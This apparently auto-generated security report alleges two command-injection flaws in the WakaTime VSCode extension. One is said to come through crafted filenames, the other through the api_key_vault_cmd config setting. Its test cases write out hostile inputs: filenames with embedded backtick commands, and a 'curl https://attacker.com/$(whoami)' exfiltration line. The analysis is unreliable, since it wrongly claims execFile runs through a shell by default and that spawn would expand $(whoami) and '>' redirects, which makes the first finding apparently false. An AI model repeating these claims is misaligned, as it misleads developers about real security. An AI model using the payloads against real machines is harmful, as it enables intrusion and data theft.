## Combined Vulnerability List:

### 1. Command Injection in Heartbeat Sending via Malicious File Path

- Description:
    - The WakaTime extension for VSCode is vulnerable to command injection when sending heartbeats.
    - This vulnerability arises from insufficient sanitization of file paths when the extension interacts with the `wakatime-cli` to send heartbeats to the WakaTime API.
    - Specifically, the extension uses `child_process.execFile` to execute the `wakatime-cli` with arguments, including the file path being tracked, passed via the `--entity` flag.
    - The extension attempts to sanitize file paths using a custom `Utils.quote` function, which only encloses strings in double quotes if they contain spaces and escapes double quotes within the string.
    - This sanitization is inadequate to prevent command injection when file paths contain other shell-sensitive characters that are interpreted by the shell, especially because `execFile` is used without the `shell: false` option.
    - An attacker can exploit this by creating a file with a malicious name that includes shell command separators or injection payloads (e.g., using backticks, dollar signs, etc.).
    - When the extension sends a heartbeat for such a file, the malicious file name is passed as an argument to `wakatime-cli` and executed by `child_process.execFile`, leading to command injection.
    - **Step-by-step trigger:**
        1. An attacker crafts a file with a malicious filename within a project opened in VSCode. For example: `testfile\`\` -i "malicious command" \`\`.js` or ``test`touch /tmp/wakatime-pwned.txt`.js``.
        2. The attacker opens this file in VSCode editor.
        3. The WakaTime extension automatically triggers a heartbeat event for the opened file.
        4. The `sendHeartbeat` function in `src/wakatime.ts` is invoked.
        5. The `sendHeartbeat` function constructs arguments for `wakatime-cli`, incorporating the malicious filename as the `--entity` argument.
        6. `child_process.execFile` is then called with the `wakatime-cli` binary and the crafted arguments.
        7. Due to the insufficient sanitization provided by `Utils.quote`, the filename is not properly escaped, and the shell command injection payload embedded in the filename is executed by the system shell.

- Impact:
    - **Critical**
    - Successful command injection allows an attacker to execute arbitrary commands on the system with the privileges of the user running VSCode.
    - This can result in a complete compromise of the user's machine, encompassing data theft, malware installation, and the potential for further propagation of attacks across a network.

- Vulnerability rank: critical

- Currently implemented mitigations:
    - The project implements a `Utils.quote` function in `src/utils.ts` to add double quotes around arguments containing spaces and escape double quotes.
    - However, this mitigation is insufficient as it fails to escape other shell-sensitive characters crucial for preventing command injection.
    - Location: `src/utils.ts` (definition) and `src/wakatime.ts` (usage).

- Missing mitigations:
    - **Proper sanitization of file paths:** Implement robust sanitization of all file paths and other arguments passed to `wakatime-cli` to effectively prevent command injection. This should include escaping or removing all shell-sensitive characters like backticks, dollar signs, semicolons, ampersands, quotes, etc.
    - **Utilize `shell: false` option in `child_process.execFile`:**  Employ the `shell: false` option when using `child_process.execFile`. This will prevent the shell from interpreting any shell metacharacters in the arguments, thereby avoiding command injection.
    - **Consider using `child_process.spawn`:** Explore using `child_process.spawn` with explicitly separated command and arguments. This method inherently avoids shell injection when `shell: true` is not used, providing a safer way to execute external commands.
    - **Input validation:** Implement validation of file paths and project names to ensure they conform to expected formats and do not contain suspicious or disallowed characters before processing them.
    - **Parameterized command execution:** Investigate and utilize parameterized command execution methods provided by the Node.js `child_process` API, if available, to further minimize the risk of shell interpretation of arguments.

- Preconditions:
    - An attacker must be capable of creating a file with a maliciously crafted name within a project folder that is opened in VSCode.
    - The WakaTime extension must be installed, activated, and enabled in VSCode.

- Source code analysis:
    - **File:** `/code/src/wakatime.ts`
    - **Function:** `sendHeartbeat` and `_sendHeartbeat`

    ```typescript
    private async _sendHeartbeat(
        doc: vscode.TextDocument,
        time: number,
        selection: vscode.Position,
        isWrite: boolean,
        isCompiling: boolean,
        isDebugging: boolean,
    ): Promise<void> {
        if (!this.dependencies.isCliInstalled()) return;

        let file = doc.fileName;
        // ...
        let args: string[] = [];

        args.push('--entity', Utils.quote(file)); // [!] Vulnerable point: file path is quoted using insufficient Utils.quote

        // ... other arguments ...

        const binary = this.dependencies.getCliLocation();
        this.logger.debug(`Sending heartbeat: ${Utils.formatArguments(binary, args)}`);
        const options = Desktop.buildOptions();
        let proc = child_process.execFile(binary, args, options, (error, stdout, stderr) => { // [!] Vulnerable point: child_process.execFile is used, which is susceptible to shell injection if arguments are not properly sanitized.
            // ... error handling ...
        });
        // ...
    }
    ```

    - **File:** `/code/src/utils.ts`
    - **Function:** `quote`

    ```typescript
    public static quote(str: string): string {
        if (str.includes(' ')) return `"${str.replace('"', '\\"')}"`; // [!] Insufficient sanitization: only handles spaces and double quotes.
        return str;
    }
    ```

    ```mermaid
    graph LR
        A[User opens malicious file] --> B(WakaTime Extension);
        B --> C{sendHeartbeat()};
        C --> D{_sendHeartbeat()};
        D --> E[Construct command arguments with Utils.quote()];
        E --> F[child_process.execFile(wakatime-cli, args)];
        F --> G[System Shell executes command];
        G --> H{Command Injection Vulnerability};
    ```

- Security test case:
    - **Step-by-step test:**
        1. Create a new project directory, for example `wakatime-test-project`.
        2. Open VSCode and open the `wakatime-test-project` directory.
        3. Create a new file with a malicious name, such as `testfile\`\`touch $HOME/command_injection_marker\`\`.js` or ``test`touch /tmp/wakatime-pwned.txt`.js`` in `wakatime-test-project`.
        4. Open the created file in VSCode editor.
        5. Observe if a file named `command_injection_marker` is created in your home directory (`$HOME`) or if `/tmp/wakatime-pwned.txt` is created.
        6. If the marker file is created, it signifies successful command injection.
        7. (Cleanup) Delete the created marker file (e.g., `command_injection_marker` or `/tmp/wakatime-pwned.txt`).

### 2. Command Injection via `api_key_vault_cmd` Configuration Setting

- Description:
    - The WakaTime extension is vulnerable to command injection through the `api_key_vault_cmd` configuration setting.
    - This setting, intended to allow users to retrieve their API key from a vault command, is read from the `~/.wakatime.cfg` configuration file.
    - The extension retrieves the value of `api_key_vault_cmd` and directly splits it into command and arguments based on spaces.
    - Subsequently, it employs `child_process.spawn` to execute the command derived from `api_key_vault_cmd` without any form of sanitization or validation of the command or its arguments.
    - If a user is misled into setting a malicious command within the `api_key_vault_cmd` setting, the extension will execute this arbitrary command.
    - **Step-by-step trigger:**
        1. An attacker needs to influence the user to set a malicious command in the `api_key_vault_cmd` setting within their `~/.wakatime.cfg` file. This could be achieved through social engineering, providing a malicious configuration file, or exploiting another vulnerability to modify user settings.
        2. The user configures the `api_key_vault_cmd` setting with a malicious command, for example: `echo vulnerable > /tmp/wakatime_vuln_test`.
        3. The WakaTime extension attempts to retrieve the API key, which triggers the execution of the command specified in `api_key_vault_cmd`.
        4. The `getApiKeyFromVaultCmd()` function in `src/options.ts` reads the `api_key_vault_cmd` setting.
        5. The function splits the command string by spaces to separate the command name and arguments.
        6. `child_process.spawn` is used to execute the command and arguments directly from the configuration setting.
        7. The malicious command is executed by the system shell.

- Impact:
    - **High**
    - Arbitrary command execution on the user's machine with the privileges of the VSCode process.
    - An attacker could potentially gain full control over the user's system, enabling them to steal sensitive information, install malware, or perform other malicious actions.

- Vulnerability Rank: high

- Currently implemented mitigations:
    - None. The extension directly executes the command as provided in the `api_key_vault_cmd` configuration setting without any validation or sanitization.

- Missing mitigations:
    - **Input validation and sanitization:** Implement strict input validation and sanitization for the `api_key_vault_cmd` setting. Validate that the command conforms to expected patterns and sanitize any arguments to prevent command injection.
    - **Avoid `child_process.spawn` for user-provided commands:** Refrain from using `child_process.spawn` to execute commands directly from user-provided settings. If executing external commands is necessary, adopt more secure methods.
    - **Command whitelisting:** If external commands are required, consider whitelisting only a predefined set of allowed commands and strictly validate or sanitize any arguments passed to these commands.
    - **Principle of least privilege:** Apply the principle of least privilege when executing external commands. Ensure that the executed commands run with the minimum necessary privileges.
    - **Secure alternatives:** Explore safer alternatives to `child_process.spawn` if possible, or utilize more secure methods for handling external processes in Node.js.

- Preconditions:
    - The user must have the `api_key_vault_cmd` setting configured in their `~/.wakatime.cfg` file.
    - An attacker must be able to influence the value of this setting, either by tricking the user or through other means.

- Source code analysis:
    - **File:** `/code/src/options.ts`
    - **Function:** `getApiKeyFromVaultCmd()`
    - **Code Snippet:**
        ```typescript
        public async getApiKeyFromVaultCmd(): Promise<string> {
            try {
              // Use basically the same logic as wakatime-cli to interpret cmdStr
              // https://github.com/wakatime/wakatime-cli/blob/1fd560a/cmd/params/params.go#L697
              const cmdStr = await this.getSettingAsync<string>('settings', 'api_key_vault_cmd');
              if (!cmdStr?.trim()) return '';

              const cmdParts = cmdStr.trim().split(' '); // Split command string by spaces
              if (cmdParts.length === 0) return '';

              const [cmdName, ...cmdArgs] = cmdParts; // Destructure into command and arguments

              const options = Desktop.buildOptions();
              const proc = child_process.spawn(cmdName, cmdArgs, options); // Execute command using child_process.spawn

              // ... rest of the code to handle stdout, stderr, and exit code ...
            } catch (err) {
              this.logger.debug(`Exception while reading API Key Vault Cmd from config file: ${err}`);
              return '';
            }
          }
        ```
    - **Vulnerability:** The `child_process.spawn(cmdName, cmdArgs, options)` directly executes the command and arguments derived from the `api_key_vault_cmd` setting without any validation. This allows for command injection if the `api_key_vault_cmd` setting is maliciously crafted.
    - **Visualization:**
        ```
        User Config (~/.wakatime.cfg) --> api_key_vault_cmd setting --> cmdStr --> split(' ') --> cmdName, cmdArgs --> child_process.spawn(cmdName, cmdArgs) --> System Command Execution
        ```

- Security test case:
    - **Step-by-step test:**
        1. Open VSCode.
        2. Open the WakaTime configuration file (`~/.wakatime.cfg`) located in your home directory. If it doesn't exist, create it.
        3. Add or modify the `api_key_vault_cmd` setting under the `[settings]` section with a malicious command. For example, to create a marker file:
            ```ini
            [settings]
            api_key_vault_cmd = echo vulnerable > /tmp/wakatime_vuln_test
            ```
        4. Restart VSCode or reload the WakaTime extension to ensure the configuration is re-read.
        5. Check if the command was executed. In this case, verify if the file `/tmp/wakatime_vuln_test` was created and contains the word "vulnerable".
        6. For a more impactful test, use a command to attempt data exfiltration to an attacker-controlled server:
            ```ini
            [settings]
            api_key_vault_cmd = curl https://attacker.com/$(whoami)
            ```
        7. Monitor network traffic or attacker's server logs to confirm command execution and potential data exfiltration.
        8. (Cleanup) Remove the malicious `api_key_vault_cmd` setting from your `~/.wakatime.cfg` file and delete any marker files created during testing (e.g., `/tmp/wakatime_vuln_test`).
